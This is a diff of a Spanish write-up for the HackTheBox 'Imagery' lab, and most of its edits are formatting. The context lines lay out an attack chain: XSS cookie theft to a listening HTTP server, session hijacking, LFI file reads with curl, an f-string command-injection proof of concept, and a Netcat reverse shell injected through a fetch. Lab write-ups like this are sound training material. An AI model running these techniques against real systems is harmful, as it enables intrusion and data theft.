@@ -90,6 +90,7 @@ Para explotar esta vulnerabilidad y obtener la cookie de sesión del administrad
 ```
 python -m http.server 8080
 ```
+
 Posteriormente, enviamos un reporte de error inyectando un payload diseñado para forzar al navegador de la víctima a redirigirse a nuestro servidor, adjuntando sus cookies en la URL:
 
 **Payload inyectado**:
@@ -129,11 +130,12 @@ Al no tener la flag `HttpOnly` incluida en el encabezado `HTTP Set-Cookie` deja 
 Con esta cookie, procedemos a suplantar la identidad del administrador en el navegador para acceder a funciones restringidas. 
 
 ### 2.1.1 Secuestro de sesion
+
 Con la cookie de sesión del administrador en nuestro poder, procedemos a realizar un **Session Hijacking**. Para ello, interceptamos la sesión actual en el navegador (vía DevTools > Storage) y sustituimos el valor de nuestra cookie `session` por el token capturado.
 
 ![](/assets/images/htb-writeup-imagery/secuestroSesion.png)
 
-Tras refrescar la página, el servidor nos reconoce como el usuario `admin@imagery.htb`. Al explorar el panel administrativo, identificamos nuevas funcionalidades críticas:
+Tras refrescar la página, el servidor nos reconoce como el usuario **admin@imagery.htb**. Al explorar el panel administrativo, identificamos nuevas funcionalidades críticas:
 
 - Gestión de usuarios (Eliminación).
 - Visualización y borrado de reportes de errores.
@@ -148,7 +150,9 @@ await fetch("http://imagery.htb:8000/admin/get_system_log?log_identifier=admin%4
 });
 
 ```
+
 ## 2.2 Local File Inclusion (LFI)
+
 Al analizar  el **Path** `/admin/get_system_log` y su **Query scrign** `?log_identifier=admin%40imagery.htb.log` notamos que el parámetro recibe el nombre de un log. En aplicaciones basadas en **Flask**, este comportamiento suele indicar que el backend utiliza una función de lectura de archivos para servir el contenido dinámicamente.
 
 Si el servidor no sanitiza correctamente esta entrada (por ejemplo, mediante el uso de `os.path.join` sin validar secuencias de escape), estaríamos ante una vulnerabilidad de **Local File Inclusion (LFI)** o **Arbitrary File Read**.
@@ -156,6 +160,7 @@ Si el servidor no sanitiza correctamente esta entrada (por ejemplo, mediante el 
 Para confirmarlo, realizamos una fase de **Web Fuzzing** sobre el parámetro `log_identifier`. El objetivo es identificar si la aplicación permite el salto de directorios utilizando caracteres especiales (`../`).
 
 ### 2.2.1 Web Fuzzing con Burp Suite
+
 Para validar el alcance del LFI, utilizamos el módulo **Intruder** de Burp Suite configurado en modo Sniper. Empleamos la wordlist [SecList/Fuzzing/LFI/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), la cual contiene una amplia variedad de secuencias de salto de directorio y archivos conocidos de Linux.
 
 Encontramos que podemos descargar y ver los directorios estandares del sistema.
@@ -181,7 +186,7 @@ Tras confirmar la ruta del usuario en las variables de entorno, procedemos a exf
 Utilizamos `curl` para descargar el código, autenticándonos con la cookie de administrador secuestrada:
 
 ```
-curl -s -O -b 'session={admin_cookie}'  http://imagery.htb:8000/admin/get_system_log?log_identifier=/home/web/web/app.py
+curl -s -O -b 'session={admin_cookie}' http://imagery.htb:8000/admin/get_system_log?log_identifier=/home/web/web/app.py
 ```
 
 Se confirma que `SESSION_COOKIE_HTTPONLY` está explícitamente en False, lo que permitió nuestro ataque inicial de XSS
@@ -259,7 +264,7 @@ SYSTEM_LOG_FOLDER = 'system_logs'
 
 ## 2.3 Remote Code Execution( RCE)
 
-Analicemos el metodo `apply_visual_transform()` de  `api_edit.py`
+Analicemos el metodo `apply_visual_transform()` de `api_edit.py`
 
 ```py
 @bp_edit.route('/apply_visual_transform', methods=['POST'])
@@ -342,7 +347,7 @@ def apply_visual_transform():
 
 ```
 
-Tras analizar el código fuente exfiltrado de `api_edit.py`, identificamos una vulnerabilidad crítica en el endpoint `/apply_visual_transform`. Aunque la función está restringida a usuarios con el atributo `is_testuser_account` (el cual confirmamos que posee el usuario **testuser@imagery.htb** en db.json), un administrador puede interactuar con ella si la lógica de sesión lo permite o si se suplanta a dicho usuario.
+Identificamos una vulnerabilidad crítica en el endpoint `/apply_visual_transform`. Aunque la función está restringida a usuarios con el atributo `is_testuser_account` (el cual confirmamos que posee el usuario **testuser@imagery.htb** en db.json), un administrador puede interactuar con ella si la lógica de sesión lo permite o si se suplanta a dicho usuario.
 
 Como vemos en el codigo fuente, este metodo tiene varias acciones para transformar una imagen: 
 - `crop`: Recortar
@@ -351,7 +356,7 @@ Como vemos en el codigo fuente, este metodo tiene varias acciones para transform
 - `brightness`: Brillo
 - `contrast`: Constraste
 
-Analicemos la accion de recortar en el condicional.
+Analicemos el condicional de la accion de recortar.
 
 ```py
 if transform_type == 'crop':
@@ -371,7 +376,8 @@ Para explotar esto, necesitamos que el parámetro `x` rompa la sintaxis del coma
 
 Mientras que las otras funciones (`rotate`, `saturation`, etc.) utilizan una lista de argumentos en `subprocess.run` (lo cual es seguro), la función `crop` usa una `f-string` vulnerable.
 
-Ejemplo: mini PoC
+**Ejemplo**:
+
 ```py
 import subprocess
 
@@ -392,7 +398,8 @@ command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height
 # IMPORTANTE: shell=True es obligatorio para que esto funcione
 subprocess.run(command, shell=True)
 ```
-En este script de python vemos que es posible romper la cadena y usar `x` como inyector.
+
+En este script vemos que es posible romper la cadena y usar `x` como inyector.
 
 ### 2.3.1  Rompimiento de Hashes (Cracking)
 
@@ -410,7 +417,7 @@ Con estas credenciales, cerramos la sesión de administrador e iniciamos sesión
 
 ### 2.3.2 Web Shell
 
-Para disparar la vulnerabilidad de inyección de comandos, es requisito que el usuario cuente con al menos una imagen previa en su galería, permitiendo así invocar la peticion `/apply_visual_transform`. El objetivo técnico es forzar al servidor a ejecutar una Reverse Shell (o shell inversa).
+Para disparar la vulnerabilidad de inyección de comandos, es requisito que el usuario cuente con al menos una imagen previa en su galería, permitiendo así invocar la peticion `/apply_visual_transform`. El objetivo es forzar al servidor a web ejecutar una **Reverse Shell**.
 
 En nuestra máquina de ataque, inicializamos un listener con **Netcat** para capturar la comunicación entrante:
 
@@ -431,7 +438,7 @@ Para que el servidor web se conecte hacia nuentra maquina haremos uso del siguie
 
 - `0>&1`: Redirige la entrada estándar (`stdin`) al mismo descriptor de archivo, permitiendo que los comandos que enviemos desde Netcat sean ejecutados por la shell de la víctima.
 
-Procedemos a capturar el fetch de la peticion `/apply_visual_transform` e inyectar el payload en el parametro `x` y ejecutamos el fetch en la consala del navegador.
+Procedemos a capturar el fetch de la peticion `/apply_visual_transform`, inyectar el payload en el parametro `x` y ejecutamos el fetch en la consala del navegador.
 
 ```js
 await fetch("http://imagery.htb:8000/apply_visual_transform", {
